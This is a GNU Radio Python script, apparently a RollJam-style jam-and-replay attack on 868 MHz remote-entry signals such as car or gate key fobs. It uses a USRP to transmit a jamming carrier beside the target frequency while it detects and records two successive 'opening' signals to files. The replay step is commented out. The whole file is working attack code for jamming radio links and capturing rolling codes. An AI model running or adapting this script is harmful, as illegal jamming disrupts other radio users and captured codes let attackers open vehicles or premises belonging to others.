#!/usr/bin/env python2
# -*- coding: utf-8 -*-
##################################################
# GNU Radio Python Flow Graph
# Title: Jr
# Generated: Thu Jan 31 16:45:28 2019
##################################################


if __name__ == '__main__':
    import ctypes
    import sys
    if sys.platform.startswith('linux'):
        try:
            x11 = ctypes.cdll.LoadLibrary('libX11.so')
            x11.XInitThreads()
        except:
            print "Warning: failed to XInitThreads()"

from gnuradio import analog
from gnuradio import blocks
from gnuradio import eng_notation
from gnuradio import filter
from gnuradio import gr
from gnuradio import uhd
from gnuradio.eng_option import eng_option
from gnuradio.filter import firdes
from grc_gnuradio import blks2 as grc_blks2
from grc_gnuradio import wxgui as grc_wxgui
from optparse import OptionParser
import time
import wx


class jr(grc_wxgui.top_block_gui):

    def __init__(self):
        grc_wxgui.top_block_gui.__init__(self, title="Jr")
        _icon_path = "/usr/share/icons/hicolor/32x32/apps/gnuradio-grc.png"
        self.SetIcon(wx.Icon(_icon_path, wx.BITMAP_TYPE_ANY))

        ##################################################
        # Variables
        ##################################################
        self.selector_output = selector_output = 0
        self.samp_rate = samp_rate = 2e6
        self.gain_send = gain_send = 30
        self.gain_jam = gain_jam = 70
        self.freq_send = freq_send = 868.4e6
        self.freq_recv = freq_recv = 868.4e6
        self.freq_jam = freq_jam = 868.52e6
        self.file_signal_1 = file_signal_1 = "/home/user/signal/opening1"
        self.device_addr = device_addr = "serial=XXXXXXX"
        self.cut_off = cut_off = 100e3

        ##################################################
        # Blocks
        ##################################################
        self.uhd_usrp_source_0 = uhd.usrp_source(
        	",".join(("serial=XXXXXXX", "")),
        	uhd.stream_args(
        		cpu_format="fc32",
        		channels=range(1),
        	),
        )
        self.uhd_usrp_source_0.set_subdev_spec('A:B', 0)
        self.uhd_usrp_source_0.set_samp_rate(samp_rate)
        self.uhd_usrp_source_0.set_center_freq(freq_recv, 0)
        self.uhd_usrp_source_0.set_gain(40, 0)
        self.uhd_usrp_source_0.set_antenna('RX2', 0)
        self.uhd_usrp_sink_0_0 = uhd.usrp_sink(
        	",".join(("serial=31736EF", "")),
        	uhd.stream_args(
        		cpu_format="fc32",
        		channels=range(1),
        	),
        )
        self.uhd_usrp_sink_0_0.set_subdev_spec('A:A', 0)
        self.uhd_usrp_sink_0_0.set_samp_rate(samp_rate)
        self.uhd_usrp_sink_0_0.set_center_freq(freq_jam, 0)
        self.uhd_usrp_sink_0_0.set_gain(gain_jam, 0)
        self.uhd_usrp_sink_0_0.set_antenna('TX/RX', 0)
        self.low_pass_filter_0 = filter.fir_filter_ccf(1, firdes.low_pass(
        	1, samp_rate, cut_off, 10e3, firdes.WIN_HAMMING, 6.76))
        self.blocks_probe_signal_x_0 = blocks.probe_signal_f()
        self.blocks_file_sink_1 = blocks.file_sink(gr.sizeof_gr_complex*1, '/home/user/signal/opening2', False)
        self.blocks_file_sink_1.set_unbuffered(False)
        self.blocks_file_sink_0_0 = blocks.file_sink(gr.sizeof_gr_complex*1, '/home/user/signal/opening3', False)
        self.blocks_file_sink_0_0.set_unbuffered(False)
        self.blocks_file_sink_0 = blocks.file_sink(gr.sizeof_gr_complex*1, '/home/user/signal/opening1', False)
        self.blocks_file_sink_0.set_unbuffered(False)
        self.blocks_complex_to_mag_0 = blocks.complex_to_mag(1)
        self.blks2_selector_1 = grc_blks2.selector(
        	item_size=gr.sizeof_gr_complex*1,
        	num_inputs=1,
        	num_outputs=3,
        	input_index=0,
        	output_index=selector_output,
        )
        self.analog_sig_source_x_0 = analog.sig_source_c(samp_rate, analog.GR_CONST_WAVE, 1000, 1, 0)

        ##################################################
        # Connections
        ##################################################
        self.connect((self.analog_sig_source_x_0, 0), (self.uhd_usrp_sink_0_0, 0))
        self.connect((self.blks2_selector_1, 0), (self.blocks_file_sink_0, 0))
        self.connect((self.blks2_selector_1, 2), (self.blocks_file_sink_0_0, 0))
        self.connect((self.blks2_selector_1, 1), (self.blocks_file_sink_1, 0))
        self.connect((self.blocks_complex_to_mag_0, 0), (self.blocks_probe_signal_x_0, 0))
        self.connect((self.low_pass_filter_0, 0), (self.blks2_selector_1, 0))
        self.connect((self.low_pass_filter_0, 0), (self.blocks_complex_to_mag_0, 0))
        self.connect((self.uhd_usrp_source_0, 0), (self.low_pass_filter_0, 0))

    def get_selector_output(self):
        return self.selector_output

    def set_selector_output(self, selector_output):
        self.selector_output = selector_output
        self.blks2_selector_1.set_output_index(int(self.selector_output))

    def get_samp_rate(self):
        return self.samp_rate

    def set_samp_rate(self, samp_rate):
        self.samp_rate = samp_rate
        self.uhd_usrp_source_0.set_samp_rate(self.samp_rate)
        self.uhd_usrp_sink_0_0.set_samp_rate(self.samp_rate)
        self.low_pass_filter_0.set_taps(firdes.low_pass(1, self.samp_rate, self.cut_off, 10e3, firdes.WIN_HAMMING, 6.76))
        self.analog_sig_source_x_0.set_sampling_freq(self.samp_rate)

    def get_gain_send(self):
        return self.gain_send

    def set_gain_send(self, gain_send):
        self.gain_send = gain_send

    def get_gain_jam(self):
        return self.gain_jam

    def set_gain_jam(self, gain_jam):
        self.gain_jam = gain_jam
        self.uhd_usrp_sink_0_0.set_gain(self.gain_jam, 0)


    def get_freq_send(self):
        return self.freq_send

    def set_freq_send(self, freq_send):
        self.freq_send = freq_send

    def get_freq_recv(self):
        return self.freq_recv

    def set_freq_recv(self, freq_recv):
        self.freq_recv = freq_recv
        self.uhd_usrp_source_0.set_center_freq(self.freq_recv, 0)

    def get_freq_jam(self):
        return self.freq_jam

    def set_freq_jam(self, freq_jam):
        self.freq_jam = freq_jam
        self.uhd_usrp_sink_0_0.set_center_freq(self.freq_jam, 0)

    def get_file_signal_1(self):
        return self.file_signal_1

    def set_file_signal_1(self, file_signal_1):
        self.file_signal_1 = file_signal_1

    def get_device_addr(self):
        return self.device_addr

    def set_device_addr(self, device_addr):
        self.device_addr = device_addr

    def get_cut_off(self):
        return self.cut_off

    def set_cut_off(self, cut_off):
        self.cut_off = cut_off
        self.low_pass_filter_0.set_taps(firdes.low_pass(1, self.samp_rate, self.cut_off, 10e3, firdes.WIN_HAMMING, 6.76))


def jamming_replay_attack(tb):
#    path="/home/user/signal/opening3"
    #count the number fo received signal
    counter = 0
    suggested_threshold = 0
    # take 10 samples for the noise level to suggest a threshold
    attempt = 10
    for i in range(10):
        noise = tb.blocks_probe_signal_x_0.level()
        suggested_threshold += noise
        print(noise)
        time.sleep(1)
    suggested_threshold /= attempt
    suggested_threshold *= 5
    threshold = raw_input("Threashold? [suggested: "+str(suggested_threshold)+"/insert] ")
    if (threshold == ''):
        threshold = suggested_threshold
    else:
        threshold = float(threshold)
    time.sleep(2)
    print("Beware, the attack is starting...")
    while counter < 2:
        signal_level = tb.blocks_probe_signal_x_0.level()
        if (signal_level > threshold):
            print(str(signal_level)+" > "+str(threshold))
            tb.set_selector_output(1)
            counter += 1
            if (counter == 1): # first signal detected
                print("Jamming and recording the 1st signal")
#                tb.set_file_signal_1(path)
#                tb.blocks_file_sink_0.close()
                tb.set_selector_output(2)
                time.sleep(1)
            elif (counter == 2): # second signal detected
                print("Jamming and recording the 2st signal, sending the 1st in a sec...")
                time.sleep(1)
#                tb.set_selector_input(1)
#                tb.set_freq_jam(433.92e6)
#                time.sleep(1)
    return

def main(top_block_cls=jr, options=None):

    tb = top_block_cls()
    tb.Start(True)
    jamming_replay_attack(tb)
    exit()
    #tb.Wait()

if __name__ == '__main__':
    main()
